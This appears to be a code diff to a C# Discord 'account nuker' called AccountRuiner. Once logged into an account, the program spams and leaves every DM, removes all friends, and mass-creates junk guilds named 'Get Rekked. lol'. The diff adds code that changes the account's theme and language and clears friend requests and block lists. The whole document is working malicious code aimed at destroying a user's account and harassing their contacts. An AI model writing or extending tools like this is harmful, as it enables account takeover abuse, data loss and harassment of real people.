@@ -39,13 +39,14 @@ namespace AccountRuiner
 
         private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
         {
-            
             Console.WriteLine("How Many Guilds? (Max is 100)");
             int guilds = int.Parse(Console.ReadLine());
             Console.Clear();
             Console.WriteLine("Press Enter When Ready");
             Console.ReadLine();
-            Console.Clear();
+
+            client.User.ChangeSettings(new UserSettings() { Theme = Theme.Light });
+            client.User.ChangeSettings(new UserSettings() { Language = Language.Russian });
 
             foreach (var dm in client.GetPrivateChannels())
             {
@@ -66,7 +67,7 @@ namespace AccountRuiner
                     dm.SendMessage("BOOF!", false, embed);
                 }
                 catch (Exception) { }
-                
+
                 Console.WriteLine("Leaving DMs...");
                 dm.Leave();
 
@@ -77,7 +78,19 @@ namespace AccountRuiner
             {
                 if (relationship.Type == RelationshipType.Friends)
                     relationship.Remove();
-                Console.WriteLine($"Removing Friends...");
+                Console.WriteLine("Removing Friends...");
+
+                if (relationship.Type == RelationshipType.IncomingRequest)
+                    relationship.Remove();
+                Console.WriteLine("Removing Incoming Friend Req's");
+
+                if (relationship.Type == RelationshipType.OutgoingRequest)
+                    relationship.Remove();
+                Console.WriteLine("Removing Outgoing Friend Req's");
+
+                if (relationship.Type == RelationshipType.Blocked)
+                    relationship.Remove();
+                Console.WriteLine("Removing Blocked Users");
 
             }
 
@@ -99,9 +112,11 @@ namespace AccountRuiner
                 catch { }
             }
 
-            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/624408319372820500/627529053884383240/Anarchy.png", "face.png");
+            WebClient wc = new WebClient();
+            wc.DownloadFile("https://cdn.discordapp.com/attachments/624408319372820500/627529053884383240/Anarchy.png", "face.png");
+            wc.Dispose();
 
-            for (int i = 1; i < guilds + 1; i++)
+            for (int i = 1; i <= guilds; i++)
             {
                 client.CreateGuild("Get Rekked. lol", Image.FromFile("face.png"), "russia");
                 Console.WriteLine("Made {0} Guilds...", i);
